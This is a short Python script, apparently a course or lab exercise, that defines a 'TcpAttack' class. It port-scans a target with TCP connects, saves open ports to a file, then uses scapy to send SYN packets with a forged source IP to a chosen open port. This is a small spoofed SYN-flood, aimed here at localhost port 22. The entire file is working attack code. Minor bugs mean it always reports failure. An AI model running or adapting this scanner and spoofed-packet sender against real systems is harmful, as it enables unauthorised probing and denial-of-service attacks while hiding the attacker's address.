#!/usr/bin/env python2.7

# TCP Attack
# Brian Rieder
__author__ = 'brieder'

import socket
from scapy.all import *


class TcpAttack:
    def __init__(self, spoofIP, targetIP):
        self.spoofIP = spoofIP
        self.targetIP = targetIP

    def scanTarget(self, rangeStart, rangeEnd):
        with open('openports.txt', 'wa') as output_file:
            for port in range(rangeStart, rangeEnd+1):
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                test_result = sock.connect_ex((self.targetIP, port))
                if test_result == 0:
                    output_file.write(str(port) + '\n')
                sock.close()

    def attackTarget(self, port):
        success = 0
        with open('openports.txt', 'r') as port_file:
            port_contents = port_file.readlines()
        ports = [int(port_entry) for port_entry in port_contents]
        if port in ports:
            for _ in range(0, 5):
                IP_header = IP(src=self.spoofIP, dst=self.targetIP)
                TCP_header = TCP(dport=port, flags="S")
                packet = IP_header / TCP_header
                send(packet)
                # try:
                #     send(packet)
                #     success = 1
                # except Exception as exception:
                #     print(exception)
        return success

if __name__ == '__main__':
    spoofIP = '127.0.0.1'
    targetIP = '127.0.0.1'
    rangeStart = 1
    rangeEnd = 100
    port = 22
    Tcp = TcpAttack(spoofIP, targetIP)
    Tcp.scanTarget(rangeStart, rangeEnd)
    if Tcp.attackTarget(port):
        print("Port " + str(port) + " was able to be attacked.")
    else:
        print("Port " + str(port) + " was not able to be attacked.")
